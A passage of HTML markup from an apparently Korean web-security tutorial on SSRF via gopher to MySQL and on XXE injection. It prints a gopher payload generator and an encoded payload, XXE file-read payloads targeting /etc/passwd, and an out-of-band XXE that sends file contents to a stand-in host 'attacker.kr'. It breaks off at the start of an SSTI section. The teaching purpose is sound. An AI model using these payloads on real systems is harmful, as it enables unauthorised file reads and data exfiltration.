class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACo0lEQVQoz1WSy08TURSHZ20U91KdTplCy1gfoEgpCFapIT5igJLwb2jYuDC60BjfG0xMUONKTdSoC7G0pbxKW6Xy8IG6ANoCCoqPpO1MsfKZmWICN/nyO+fm5svJvVewlduw2QtUVlbg2OHAbJEwSxKWkhJkq0yZrcxAlkswS2ZEUUQ0i5jNIhZJZJskIlkk5FIZwaO4OCDX4La6uH25k9CTF/gePKPnwTP6nvoY6u4j0hshGooaDPkHGfD109cdYnJsgksdZ9m50UqdqYK64goEj7SPRrGOI3I9T+71EI8uEOlPEBtM8Wr4C68i63kd/cpIbIFYeI6PnzQud1xHEbbg3KhQvcGO4LHvxV3i5qjdzf27fkIDC/gDCQLBpJFrCQQTBFbT55siOvKL8yev4BBM1Gx24CxSEE6UN3KstIHjtgbu3+lhYGiRYDBBb2/SyFAoRSj0v06u9in8/mli8d9cOHW1ICzajnOTgnDUXk+T3MBhs4tHXc8ZDU8T653kzfAMbyIJPozO8WlinsmxOT7ojM4WcizF/GyWG6evoQjFhQl14UGrfpku3FudPLz1mLD/Lf3dcYYC4wwPfCQW/sx4fIr3EzO8G5/h7eg0M5NJ5j8nUX9m6DxzjfK1wia5loOmajxiDcGXYZaykFpMM/c9y+y3LF9/qCylc+tQc3k0dRl9dV28iV3Yguu/0CPvw72tFo+ljvhgxDi0ktcP5wus5Fn5m4e/hVrPfP4PmqqtCjsNoT5htf4oTaU1NIr7OWRyMujrQ83lSKfTLC8vk8lkjDqXy6GqGllVRdNyaJpGNpM1hJ3nbqAIJlxFDuPrCFU7K9mjVFLl2IO3xUt7ezter5e2trZ1tLS00NzcTGtrq4He6/v1rv0oko3dZQ52WbfzDwqUSA5WfSoQAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Gopher Wireshark\"\n        title=\"Gopher Wireshark\"\n        src=\"/static/9380958e37abacec33b7ce490b8e2342/37523/0.png\"\n        srcset=\"/static/9380958e37abacec33b7ce490b8e2342/e9ff0/0.png 180w,\n/static/9380958e37abacec33b7ce490b8e2342/f21e7/0.png 360w,\n/static/9380958e37abacec33b7ce490b8e2342/37523/0.png 720w,\n/static/9380958e37abacec33b7ce490b8e2342/302a4/0.png 1080w,\n/static/9380958e37abacec33b7ce490b8e2342/07a9c/0.png 1440w,\n/static/9380958e37abacec33b7ce490b8e2342/29114/0.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>gopher 패킷 구축</strong></p>\n<ul>\n<li>mysql 로 로그인한 해당 패킷 raw 데이터를 기반으로 gopher 패킷을 생성하여 쿼리를 수행할 수 있는 하나의 페이로드를 만들어보겠습니다.</li>\n</ul>\n<p><a href=\"https://github.com/tarunkant/Automation/blob/master/SSRF-through-Gopher.py\">Automation/SSRF-through-Gopher.py at master · tarunkant/Automation</a></p>\n<ul>\n<li>위 script를 활용하여 raw 데이터를 gopher 패킷으로 formatting 할 수 있도록 도와주는 도구를 사용하였습니다.</li>\n<li>직접 구성을 해서 만드는 것도 추천합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">dump <span class=\"token operator\">=</span> <span class=\"token function\">raw_input</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Give connection packet of mysql: \"</span><span class=\"token punctuation\">)</span>\nquery <span class=\"token operator\">=</span> <span class=\"token function\">raw_input</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Give query to execute: \"</span><span class=\"token punctuation\">)</span>\n\nauth <span class=\"token operator\">=</span> dump<span class=\"token operator\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span>\n\ndef <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token class-name return-type\">a</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"gopher://127.0.0.1:3306/_%\"</span> <span class=\"token operator\">+</span> <span class=\"token string double-quoted-string\">\"%\"</span><span class=\"token operator\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n\ndef <span class=\"token function\">get_payload</span><span class=\"token punctuation\">(</span>query<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>query<span class=\"token operator\">.</span><span class=\"token function\">strip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \t<span class=\"token class-name return-type\">query</span> <span class=\"token operator\">=</span> query<span class=\"token operator\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hex\"</span><span class=\"token punctuation\">)</span>\n    \tquery_length <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'{:x}'</span><span class=\"token operator\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>query<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \tpay1 <span class=\"token operator\">=</span> query_length<span class=\"token operator\">.</span><span class=\"token function\">rjust</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string double-quoted-string\">\"00000003\"</span> <span class=\"token operator\">+</span> query\n    \t<span class=\"token keyword\">final</span> <span class=\"token operator\">=</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>auth <span class=\"token operator\">+</span> pay1 <span class=\"token operator\">+</span> <span class=\"token string double-quoted-string\">\"0100000001\"</span><span class=\"token punctuation\">)</span>\n    \t<span class=\"token keyword\">return</span> <span class=\"token keyword\">final</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>auth<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"\\nYour gopher link is ready to do SSRF : \\n\"</span>\n<span class=\"token keyword\">print</span> <span class=\"token function\">get_payload</span><span class=\"token punctuation\">(</span>query<span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>최종적인 요청 패킷을 만들어 전송시 로그인이 완료되고 쿼리를 수행할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:3306/_%25%00%00%01%85%a6%03%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%61%74%00%00%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%40%00%00%00%03%73%65%6c%65%63%74%20%67%72%6f%75%70%5f%63%6f%6e%63%61%74%28%74%61%62%6c%65%5f%6e%61%6d%65%29%20%66%72%6f%6d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%74%61%62%6c%65%73%3b%01%00%00%00%01%25%00%00%01%85%a6%03%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%61%74%00%00%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%40%00%00%00%03%73%65%6c%65%63%74%20%67%72%6f%75%70%5f%63%6f%6e%63%61%74%28%74%61%62%6c%65%5f%6e%61%6d%65%29%20%66%72%6f%6d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%74%61%62%6c%65%73%3b%01%00%00%00%01'</span></code></pre></div>\n<ul>\n<li>다음과 같은 쿼리를 구성해서 gopher 패킷을 제작해 전송하여 서버측 데이터베이스 의 정보를 탈취할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">select @@version_comment limit <span class=\"token number\">1</span>@ select <span class=\"token function\">group_concat</span><span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> from information_schema<span class=\"token operator\">.</span>tables<span class=\"token punctuation\">;</span>\n\n<span class=\"token constant\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token constant\">FROM</span> Information_schema<span class=\"token operator\">.</span>tables <span class=\"token constant\">WHERE</span> table_schema <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'admin'</span> <span class=\"token keyword\">AND</span> table_name <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">;</span>\n\nadmin flag <span class=\"token constant\">BASE</span> TABLEInnoDB <span class=\"token number\">10</span>\n\nselect table_name<span class=\"token punctuation\">,</span>column_name from information_schema<span class=\"token operator\">.</span>columns where table_schema <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'admin'</span> <span class=\"token keyword\">and</span> table_name <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">use</span> <span class=\"token package\">admin</span><span class=\"token punctuation\">;</span>select <span class=\"token operator\">*</span> from flag<span class=\"token punctuation\">;</span></code></pre></div>\n<hr>\n<h1 id=\"xxe-xml-external-entity-injection-overview\" style=\"position:relative;\"><a href=\"#xxe-xml-external-entity-injection-overview\" aria-label=\"xxe xml external entity injection overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>XXE (XML External Entity Injection) Overview</h1>\n<ul>\n<li>대상 애플리케이션 환경에서 XML 데이터를 처리할 시 공격자가 악의적인 요소를 삽입하여 서버의 데이터를 보거나 SSRF와 함께 이용할 수 있는 취약점 입니다.</li>\n<li>XXS는 웹에서만 발생하는 취약점이 아닌, pptx, xlsx, docx 등 OOXML을 사용하는 곳에서 도 발생합니다.</li>\n</ul>\n<p><strong>XML?</strong></p>\n<ul>\n<li>eXtensible Markup Language: 확장성 있는 마크업 언어</li>\n<li>W3C가 정보를 쉽게 교환하기 위해 만든 데이터 교환 포맷</li>\n<li>다음과 같이 <code class=\"language-text\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></code> 로 시작해서 사용자가 마음대로 태그를 정의해서 사용합니다.</li>\n<li>특정 데이터를 저장할 때 다음과 같이 포맷을 만들어서 저장하고 해당 내용을 불러올 때는 프로그램에 내장된 XML Parser를 이용합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>userInfo</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>email</span><span class=\"token punctuation\">></span></span>kevin@nasa.gov<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>email</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>firstName</span><span class=\"token punctuation\">></span></span>Kevin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>firstName</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lastName</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lastName</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>userInfo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<h1 id=\"xml-external-entity-injection-취약점\" style=\"position:relative;\"><a href=\"#xml-external-entity-injection-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"xml external entity injection 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>XML External Entity Injection 취약점</h1>\n<ul>\n<li>서버상에 저장된 XML 데이터를 불러올 때 XML Parser에서 외부 엔티티를 사용한다는 구문이 있다면 XML Parser가 해당 내용을 일고 데이터를 처리합니다.</li>\n<li>만약에 일반적인 XML 데이터를 처리하는 프로그램이 있다고 하였을 때 외부 엔티티를 사용할 수있도록 코드를 주입하며 XXE 공격이 발생합니다.</li>\n<li>선언된 외부 요소를 사용하고 싶다면 <code class=\"language-text\">&amp;변수명</code> 과 같은 형식으로 사용합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">replace</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">xxe</span> <span class=\"token attr-name\">\"Uee\"</span><span class=\"token punctuation\">></span></span></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>userInfo</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>email</span><span class=\"token punctuation\">></span></span>kevin@nasa.gov<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>email</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>firstName</span><span class=\"token punctuation\">></span></span>Kevin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>firstName</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lastName</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lastName</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>userInfo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li>위 코드 인젝션을 수행하였을 경우 응답 데이터를 정상과 비교해보록 하겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\">정상 결과\nEmail : kevin@nasa.goc\nFirstName : Kevin\nLastName :\n\nXXE 공격 수행 결과\nEmail : kevin@nasa.goc\nFirstName : Kevin\nLastName : Uee</code></pre></div>\n<ul>\n<li>XXE 공격 수행 결과 “Uee” 라는 글자가 Response에 출력이 되었다면 파급력이 높은 XXE 공격이 성공할 가능성이 높아집니다.</li>\n</ul>\n<h3 id=\"그렇다면-xxe를-활용하여-무엇을-할-수-있까요\" style=\"position:relative;\"><a href=\"#%EA%B7%B8%EB%A0%87%EB%8B%A4%EB%A9%B4-xxe%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-%EB%AC%B4%EC%97%87%EC%9D%84-%ED%95%A0-%EC%88%98-%EC%9E%88%EA%B9%8C%EC%9A%94\" aria-label=\"그렇다면 xxe를 활용하여 무엇을 할 수 있까요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>그렇다면 XXE를 활용하여 무엇을 할 수 있까요?</h3>\n<ul>\n<li>파일 읽기 (file://, php://)</li>\n<li>SSRF (Port Scan, HTTP GET 접속,…)</li>\n<li>DOS (메모리 고갈 ⇒ &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, …)</li>\n<li>Remote Code Execution (jar:// , XXE+SSRF(gopher://))</li>\n<li>…</li>\n</ul>\n<h3 id=\"xxe-파일-읽기\" style=\"position:relative;\"><a href=\"#xxe-%ED%8C%8C%EC%9D%BC-%EC%9D%BD%EA%B8%B0\" aria-label=\"xxe 파일 읽기 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>XXE 파일 읽기</h3>\n<ul>\n<li>file:// 프로토콜을 활용하여 서버내 파일을 읽어올 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">foo</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY xxe SYSTEM \"file://etc/passwd\"></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>userInfo</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>email</span><span class=\"token punctuation\">></span></span>kevin@nasa.gov<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>email</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>firstName</span><span class=\"token punctuation\">></span></span>Kevin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>firstName</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lastName</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lastName</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>userInfo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li>다음과 같이 서버에서 직접 접근해서 파일을 읽어오는 과정에서 인코딩 중 <code class=\"language-text\">&lt;, ></code> 문자가 포함되어 있는 경우 인코딩 에러가 발생할 수 있기 때문에 <code class=\"language-text\">base64</code> 인코딩을 과정을 거치는 과정을 수행합니다.</li>\n<li>php:// php wrapper 를 활용하여 base64로 응답 데이터를 인코딩을 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">foo</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\"></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>userInfo</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>email</span><span class=\"token punctuation\">></span></span>kevin@nasa.gov<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>email</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>firstName</span><span class=\"token punctuation\">></span></span>Kevin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>firstName</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lastName</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lastName</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>userInfo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<h3 id=\"bind-xxe-attack\" style=\"position:relative;\"><a href=\"#bind-xxe-attack\" aria-label=\"bind xxe attack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Bind XXE Attack</h3>\n<ul>\n<li>XXE 공격이 가능한 벡터가 존재하지만 서버에서 응답을 받을 수 없는 경우 활용 방안 입니다.</li>\n<li>다음은 외부 서버에 페이로드를 구성합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\">payload.xml\n\n&lt;!ENTITY % eval \"&lt;!ENTITY exfil SYSTEM 'http://attacker.kr/data?=%data;'>\"> %eval;</code></pre></div>\n<ul>\n<li>다음은 대상 애플리케이션 에 공격할 페이로드 입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">foo</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n&lt;!ENTITY % oob SYSTEM \"http://attacker.kr/payload.xml\"> % oob;</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>userInfo</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>email</span><span class=\"token punctuation\">></span></span>kevin@nasa.gov<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>email</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>firstName</span><span class=\"token punctuation\">></span></span>Kevin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>firstName</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lastName</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&exfil;\">&amp;exfil;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lastName</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>userInfo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li>해당 페이로드가 동작을 하면서 공격자 서버 access_log에 base64로 인코딩 된정보를 확인할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\">GET /data?bidF3123232oij== HTTP/1.0</code></pre></div>\n<hr>\n<h1 id=\"ssti-server-side-template-injection-overview\" style=\"position:relative;\"><a href=\"#ssti-server-side-template-injection-overview\" aria-label=\"ssti server side template injection overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 